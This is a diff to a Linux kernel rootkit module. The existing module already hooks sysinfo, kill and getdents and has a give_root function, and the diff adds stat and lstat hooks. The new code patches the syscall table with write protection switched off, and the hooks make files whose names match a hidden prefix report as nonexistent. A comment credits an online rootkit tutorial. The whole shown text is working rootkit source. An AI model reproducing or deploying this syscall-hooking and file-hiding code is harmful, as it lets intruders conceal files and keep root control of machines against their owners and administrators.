@@ -32,6 +32,8 @@
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage int (*original_stat)(const char *path, struct stat *buf);
+asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
 
 
 void update_sys_calls(void **sys_call_table){
@@ -41,11 +43,17 @@ void update_sys_calls(void **sys_call_table){
     void *modified_function_kill = hacked_kill;
     void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
     void *modified_function_getdents = hacked_getdents;
+    void **modified_at_address_stat = &sys_call_table[__NR_stat];
+    void *modified_function_stat = hacked_stat;
+    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
+    void *modified_function_lstat = hacked_lstat;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
     original_kill = xchg(modified_at_address_kill, modified_function_kill);
     original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
+    original_stat = xchg(modified_at_address_stat, modified_function_stat);
+    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -56,11 +64,17 @@ void revert_to_original(void **sys_call_table){
     void *modified_function_kill = original_kill;
     void **modified_at_address_getdents = &sys_call_table[__NR_getdents];
     void *modified_function_getdents = original_getdents;
+    void **modified_at_address_stat = &sys_call_table[__NR_stat];
+    void *modified_function_stat = original_stat;
+    void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
+    void *modified_function_lstat = original_lstat;
 
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
     original_kill = xchg(modified_at_address_kill, modified_function_kill);
     original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
+    original_stat = xchg(modified_at_address_stat, modified_function_stat);
+    original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -123,6 +137,56 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
     }
 
     return ret;
+}
+
+// given a filename w/ path, replaces with just filename
+// returns string w/o path
+const char* strip_filepath(const char* filepath) {
+    // int i, replace_i;
+    // // try to find a '/'
+    // for(i = 0; i < strlen(filepath), i++) {
+    //     // get ready to copy over to the start of the string next loop
+    //     if (filepath[i] == '/') {
+    //         replace_i = 0;
+
+    //         break;   
+    //     }
+    //     // else, move everything after to the start & end with a null terminator
+    //     if (replace_i != -1) {
+
+    //     }
+    // }
+    // if we don't find one - return as per usual
+
+    const char* loc = strrchr(filepath, '/');
+    if (loc == NULL) {
+        // there is no path - only a filename
+        return filepath;
+    } else {
+        return loc + sizeof(char);
+    }
+}
+
+// code heavily inspired by:
+// https://exploit.ph/linux-kernel-hacking/2014/10/23/rootkit-for-hiding-files/index.html
+// NOTE: this does not append 'No such file or directory' to the end;
+// is the error code return working?
+asmlinkage int hacked_stat(const char *path, struct stat *buf) {
+    const char* filename = strip_filepath(path);
+    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
+        return -ENOENT;
+    } else {
+        return original_stat(path, buf);
+    }
+}
+
+asmlinkage int hacked_lstat(const char *path, struct stat *buf) {
+    const char* filename = strip_filepath(path);
+    if (strncmp(filename, TO_HIDE, strlen(TO_HIDE)) == 0) {
+        return -ENOENT;
+    } else {
+        return original_lstat(path, buf);
+    }
 }
 
 void give_root(void)
